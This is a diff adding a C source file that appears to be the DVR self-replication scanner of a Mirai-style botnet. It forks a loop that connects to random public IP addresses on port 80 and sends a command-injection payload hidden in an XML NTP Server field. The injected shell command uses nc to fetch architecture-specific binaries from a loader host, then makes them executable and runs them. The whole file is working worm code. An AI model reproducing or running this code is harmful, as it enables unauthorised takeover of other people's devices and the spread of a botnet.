@@ -1,0 +1,67 @@
+#include "includes.h"
+#include "selfrep_dvr.h"
+#include "rand.h"
+#include "util.h"
+
+#ifdef SELFREP
+
+#define DVR_SCANNER_MAX_CONNS 128
+#define DVR_SCANNER_PORT 80
+
+struct dvr_conn { int fd; ipv4_t dst_addr; time_t last_recv; };
+static struct dvr_conn conns[DVR_SCANNER_MAX_CONNS];
+static ipv4_t get_random_ip_dvr(void);
+static void dvr_connect(struct dvr_conn *);
+static void dvr_close(struct dvr_conn *);
+
+void dvr_scanner_init(void) {
+    if (fork() == 0) {
+        int i;
+        for (i = 0; i < DVR_SCANNER_MAX_CONNS; i++) conns[i].fd = -1;
+        while (TRUE) {
+            fd_set fdset; struct timeval tv; int maxfd = 0;
+            FD_ZERO(&fdset);
+            for (i = 0; i < DVR_SCANNER_MAX_CONNS; i++) {
+                if (conns[i].fd != -1) { FD_SET(conns[i].fd, &fdset); if (conns[i].fd > maxfd) maxfd = conns[i].fd; }
+            }
+            tv.tv_sec = 1; tv.tv_usec = 0;
+            select(maxfd + 1, &fdset, NULL, NULL, &tv);
+            time_t now = time(NULL);
+            for (i = 0; i < DVR_SCANNER_MAX_CONNS; i++)
+                if (conns[i].fd != -1 && now - conns[i].last_recv > 10) dvr_close(&conns[i]);
+            for (i = 0; i < DVR_SCANNER_MAX_CONNS; i++) {
+                if (conns[i].fd != -1 && FD_ISSET(conns[i].fd, &fdset)) {
+                    char buf[4096]; int n = recv(conns[i].fd, buf, sizeof(buf), 0);
+                    if (n <= 0) dvr_close(&conns[i]); else conns[i].last_recv = now;
+                }
+            }
+            for (i = 0; i < DVR_SCANNER_MAX_CONNS; i++) {
+                if (conns[i].fd == -1) { conns[i].dst_addr = get_random_ip_dvr(); dvr_connect(&conns[i]); break; }
+            }
+            sleep(1);
+        }
+    }
+}
+
+static ipv4_t get_random_ip_dvr(void) { ipv4_t addr; while (TRUE) { addr = rand_next(); uint8_t f = (addr >> 24) & 0xFF; if (f >= 100 && f <= 223) break; } return addr; }
+
+static void dvr_connect(struct dvr_conn *conn) {
+    struct sockaddr_in addr; char payload[2048]; ipv4_t seed = rand_next();
+    conn->fd = socket(AF_INET, SOCK_STREAM, 0); if (conn->fd == -1) return;
+    fcntl(conn->fd, F_SETFL, O_NONBLOCK);
+    addr.sin_family = AF_INET; addr.sin_addr.s_addr = conn->dst_addr; addr.sin_port = htons(DVR_SCANNER_PORT);
+    if (connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr)) == 0 || errno == EINPROGRESS) {
+        snprintf(payload, sizeof(payload),
+            "POST /dvr/cmd HTTP/1.1\r\nHost: %d.%d.%d.%d\r\nContent-Length: 500\r\n\r\n"
+            "<?xml version=\"1.0\"?><DVR><NTP Server=\"time.nist.gov&"
+            "cd /tmp;for arch in arm mips mpsl x86 arm7 x86_64 ppc spc;do rm -f axis.$arch;for c in 0 1 2 3 4 5 6 7;do printf '\\040\\000\\000$arch' | nc -u -w1 %d.%d.%d.%d 49153 >> axis.$arch;done;chmod +x axis.$arch;done;for arch in arm mips mpsl x86 arm7 x86_64 ppc spc;do test -s axis.$arch && ./axis.$arch & done"
+            "\"/></DVR>",
+            (conn->dst_addr >> 24) & 0xFF, (conn->dst_addr >> 16) & 0xFF, (conn->dst_addr >> 8) & 0xFF, conn->dst_addr & 0xFF,
+            LOCAAL_ADDR(seed), LOCAAL_ADDR_1(seed), LOCAAL_ADDR_2(seed), LOCAAL_ADDR_3(seed));
+        send(conn->fd, payload, strlen(payload), 0); conn->last_recv = time(NULL);
+    } else { close(conn->fd); conn->fd = -1; }
+}
+
+static void dvr_close(struct dvr_conn *conn) { if (conn->fd != -1) { close(conn->fd); conn->fd = -1; } }
+
+#endif
